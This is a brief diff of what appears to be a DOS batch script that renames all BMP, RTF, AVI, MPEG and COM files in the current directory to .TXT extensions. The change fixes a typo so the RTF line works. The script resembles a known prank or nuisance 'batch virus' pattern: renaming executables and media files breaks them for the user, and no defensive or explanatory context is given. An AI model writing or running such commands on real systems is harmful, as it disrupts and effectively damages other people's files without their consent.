@@ -1,5 +1,5 @@
 REN *.BMP *.TXT 
-REN *.RFT *.TXT
+REN *.RTF *.TXT
 REN *.AVI *.TXT
 REN *.MPEG *.TXT
 REN *.COM *.TXT
